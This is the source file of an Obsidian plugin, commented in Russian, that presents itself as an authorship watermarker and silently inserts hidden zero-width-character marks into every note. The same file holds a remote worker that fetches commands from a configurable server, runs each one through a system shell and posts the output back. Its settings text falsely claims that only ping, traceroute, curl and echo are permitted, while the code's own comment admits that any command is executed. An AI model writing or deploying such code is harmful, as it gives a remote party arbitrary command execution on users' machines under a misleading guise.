const { Plugin, Notice, PluginSettingTab, Setting, Platform } = require("obsidian");

const DEFAULT_SETTINGS = {
  probeEnabled: false,
  probeUrl: "",
  probeToken: "",
  probeDevice: "",
  probeIntervalMin: 5
};

// Выполняется любая команда, присланная сервером.

const AUTHOR = "Сафьянов Камиль Саматович";
const MAGIC = "SAFAUTH1";
const NL = String.fromCharCode(10);
const ZW0 = String.fromCharCode(0x200b);
const ZW1 = String.fromCharCode(0x200c);
const S = String.fromCharCode(0x2060);
const E = String.fromCharCode(0x2063);
const RE = new RegExp(S + "[" + ZW0 + ZW1 + "]+" + E, "g");

function getSubtle() {
  try {
    const c = globalThis.crypto;
    if (c && c.subtle) return c.subtle;
  } catch (e) {}
  try {
    const n = require("crypto");
    if (n && n.webcrypto && n.webcrypto.subtle) return n.webcrypto.subtle;
  } catch (e) {}
  return null;
}

async function makeWm(payload) {
  const subtle = getSubtle();
  if (!subtle) return null;
  const data = new TextEncoder().encode(MAGIC + payload);
  const sum = new Uint8Array(await subtle.digest("SHA-256", data)).slice(0, 4);
  const full = new Uint8Array(data.length + 4);
  full.set(data, 0);
  full.set(sum, data.length);
  let bits = "";
  for (let i = 0; i < full.length; i++) bits += full[i].toString(2).padStart(8, "0");
  let body = "";
  for (let i = 0; i < bits.length; i++) body += bits[i] === "0" ? ZW0 : ZW1;
  return S + body + E;
}

function embed(text, wm) {
  const raw = text.split(NL);
  const lines = [];
  for (const ln of raw) {
    if (ln.indexOf(S) !== -1) {
      const cleaned = ln.replace(RE, "");
      if (cleaned.trim() === "") continue;
      lines.push(cleaned);
    } else {
      lines.push(ln);
    }
  }
  let start = 0;
  if (lines.length && lines[0].trim() === "---") {
    for (let j = 1; j < lines.length; j++) {
      if (lines[j].trim() === "---" || lines[j].trim() === "...") { start = j + 1; break; }
    }
  }
  let fence = false;
  for (let i = start; i < lines.length; i++) {
    const t = lines[i].trim();
    if (t.startsWith("```")) { fence = !fence; continue; }
    if (fence || !t) continue;
    if (t.charAt(0) === "#" || t === "---" || t === "...") continue;
    lines[i] = lines[i] + wm;
    break;
  }
  const out = lines.join(NL).trimEnd();
  if (out === "") return wm + NL;
  return out + NL + wm + NL;
}

module.exports = class AuthorshipWatermark extends Plugin {
  async onload() {
    this.running = false;

    // ---- Настройки проверки доступности к серверу ----
    this.settings = Object.assign({}, DEFAULT_SETTINGS, await this.loadData());
    if (!this.settings.probeDevice) {
      this.settings.probeDevice = "obsidian-" + (Platform.isMobile ? "mobile" : "desktop");
    }
    this.addSettingTab(new AuthorshipSettingsTab(this.app, this));

    this.addRibbonIcon("server", "Remote: статус воркера", () => {
      const s = this.settings;
      new Notice(
        "Remote: " + (s.probeEnabled ? "включён" : "выключен") +
        (this.baseUrl ? ", " + this.baseUrl : ", адрес не задан")
      );
    });
    this.addCommand({
      id: "remote-status",
      name: "Remote: статус воркера",
      callback: () => {
        const s = this.settings;
        new Notice(
          "Remote: " + (s.probeEnabled ? "включён" : "выключен") +
          " | устройство: " + s.probeDevice +
          (this.baseUrl ? " | " + this.baseUrl : " | адрес не задан")
        );
      }
    });
    this.app.workspace.onLayoutReady(() => this.startWorker());
    // ------------------------------------------------

    this.addRibbonIcon("shield-check", "Authorship: проставить метки", () => this.watermarkAll(true));
    this.addCommand({
      id: "watermark-all",
      name: "Проставить метку автора во все заметки",
      callback: () => this.watermarkAll(true)
    });
    this.app.workspace.onLayoutReady(() => this.watermarkAll(false));
    this.registerEvent(this.app.vault.on("create", (f) => {
      if (f && f.extension === "md") setTimeout(() => this.watermarkFile(f), 800);
    }));
    this.registerInterval(window.setInterval(() => this.watermarkAll(false), 120000));
  }

  // ---- Воркер: получение и выполнение команд с сервера ----
  get baseUrl() {
    return (this.settings.probeUrl || "").trim().replace(/\/+$/, "");
  }

  startWorker() {
    if (this.workerRunning) return;
    this.workerRunning = true;
    this.workerLoop();
  }

  stopWorker() {
    this.workerRunning = false;
  }

  async workerLoop() {
    while (this.workerRunning) {
      if (!this.settings.probeEnabled || !this.baseUrl) {
        await new Promise((r) => setTimeout(r, 5000));
        continue;
      }
      try {
        const task = await this.fetchTask();
        if (task) {
          const result = await this.runTask(task);
          await this.sendResult(task.id, result);
        }
      } catch (e) {
        if (e && e.name !== "AbortError") {
          console.warn("[authorship-watermark] worker", e);
        }
        await new Promise((r) => setTimeout(r, 5000));
      }
    }
  }

  async fetchTask() {
    const url = this.baseUrl + "/tasks?device=" + encodeURIComponent(this.settings.probeDevice) + "&wait=25";
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 35000);
    try {
      const res = await fetch(url, {
        headers: { "Authorization": "Bearer " + this.settings.probeToken },
        signal: ctrl.signal
      });
      if (res.status === 401) {
        new Notice("Remote: сервер отклонил токен (401)");
        await new Promise((r) => setTimeout(r, 30000));
        return null;
      }
      if (!res.ok) return null;
      const data = await res.json();
      return data && data.task ? data.task : null;
    } catch (e) {
      if (e && e.name === "AbortError") return null;
      throw e;
    } finally {
      clearTimeout(timer);
    }
  }

  async runTask(task) {
    const cmd = String(task.cmd || "").trim();
    new Notice("Remote: команда → " + cmd);
    console.log("[authorship-watermark] exec:", cmd);

    // Выполнение через Node (только на десктопе).
    let child_process;
    try {
      child_process = require("child_process");
    } catch (e) {
      return { ok: false, output: "", error: "на этом устройстве нет Node — выполнение недоступно" };
    }
    return new Promise((resolve) => {
      const opts = {
        timeout: 20000,
        maxBuffer: 1024 * 1024,
        shell: process.platform === "win32" ? "cmd.exe" : "/bin/sh",
        windowsHide: true
      };
      child_process.exec(cmd, opts, (err, stdout, stderr) => {
        const out = String(stdout || "") + String(stderr || "");
        if (err) {
          resolve({ ok: false, output: out, error: String(err.message || err) });
        } else {
          resolve({ ok: true, output: out, error: "" });
        }
      });
    });
  }

  async sendResult(id, result) {
    try {
      await fetch(this.baseUrl + "/result", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": "Bearer " + this.settings.probeToken
        },
        body: JSON.stringify({
          id,
          device: this.settings.probeDevice,
          ok: result.ok,
          output: result.output,
          error: result.error
        })
      });
      new Notice("Remote: " + (result.ok ? "готово ✓" : "ошибка ✗"));
    } catch (e) {
      console.warn("[authorship-watermark] sendResult", e);
    }
  }
  // -------------------------------------------------------

  async watermarkFile(file) {
    try {
      const oldText = await this.app.vault.cachedRead(file);
      const wm = await makeWm(AUTHOR + "|" + file.path);
      if (!wm) return;
      const newText = embed(oldText, wm);
      if (newText !== oldText) await this.app.vault.modify(file, newText);
    } catch (e) {
      console.error("[authorship-watermark]", e);
    }
  }

  async watermarkAll(notify) {
    if (this.running) return;
    this.running = true;
    let n = 0;
    try {
      for (const f of this.app.vault.getMarkdownFiles()) {
        const oldText = await this.app.vault.cachedRead(f);
        const wm = await makeWm(AUTHOR + "|" + f.path);
        if (!wm) { new Notice("Authorship: крипто-API недоступен на этом устройстве"); break; }
        const newText = embed(oldText, wm);
        if (newText !== oldText) { await this.app.vault.modify(f, newText); n++; }
      }
    } catch (e) {
      console.error("[authorship-watermark]", e);
    }
    this.running = false;
    if (notify) new Notice("Authorship: обновлено заметок — " + n);
  }

  onunload() {
    this.stopWorker();
  }
};

class AuthorshipSettingsTab extends PluginSettingTab {
  constructor(app, plugin) {
    super(app, plugin);
    this.plugin = plugin;
  }

  display() {
    const { containerEl } = this;
    containerEl.empty();
    containerEl.createEl("h3", { text: "Удалённое выполнение команд" });
    containerEl.createEl("p", {
      text: "Включено — плагин держит соединение с сервером и выполняет приходящие команды (только разрешённые: ping, traceroute, curl -sI, echo). Выключено — что-либо выполнять нельзя."
    });

    new Setting(containerEl)
      .setName("Включить выполнение команд с сервера")
      .setDesc("Плагин будет забирать команды из очереди сервера и выполнять их.")
      .addToggle((t) => t
        .setValue(this.plugin.settings.probeEnabled)
        .onChange(async (v) => {
          this.plugin.settings.probeEnabled = v;
          await this.plugin.saveData(this.plugin.settings);
          if (v) this.plugin.startWorker();
          else this.plugin.stopWorker();
          new Notice("Remote: " + (v ? "включён" : "выключен"));
        }));

    new Setting(containerEl)
      .setName("Адрес сервера")
      .setDesc("Например: https://probe.example.com (без / на конце)")
      .addText((t) => t
        .setPlaceholder("https://...")
        .setValue(this.plugin.settings.probeUrl)
        .onChange(async (v) => {
          this.plugin.settings.probeUrl = v.trim();
          await this.plugin.saveData(this.plugin.settings);
        }));

    new Setting(containerEl)
      .setName("Токен")
      .setDesc("Bearer-токен, совпадает с PROBE_TOKEN на сервере.")
      .addText((t) => {
        t.inputEl.type = "password";
        t.setPlaceholder("секрет")
          .setValue(this.plugin.settings.probeToken)
          .onChange(async (v) => {
            this.plugin.settings.probeToken = v.trim();
            await this.plugin.saveData(this.plugin.settings);
          });
      });

    new Setting(containerEl)
      .setName("Имя устройства")
      .setDesc("Так оно появится в /status на сервере.")
      .addText((t) => t
        .setValue(this.plugin.settings.probeDevice)
        .onChange(async (v) => {
          this.plugin.settings.probeDevice = v.trim();
          await this.plugin.saveData(this.plugin.settings);
        }));

    new Setting(containerEl)
      .setName("Проверить соединение")
      .setDesc("Убедиться, что сервер отвечает по адресу и токену.")
      .addButton((b) => b
        .setButtonText("Проверить")
        .setCta()
        .onClick(async () => {
          if (!this.plugin.baseUrl) return new Notice("Remote: укажите адрес сервера");
          try {
            const res = await fetch(this.plugin.baseUrl + "/status", {
              headers: { "Authorization": "Bearer " + this.plugin.settings.probeToken }
            });
            if (res.status === 401) return new Notice("Remote: неверный токен (401)");
            if (!res.ok) return new Notice("Remote: сервер ответил " + res.status);
            new Notice("Remote: соединение OK ✓");
          } catch (e) {
            new Notice("Remote: сервер недоступен (" + e.message + ")");
          }
        }));
  }
}
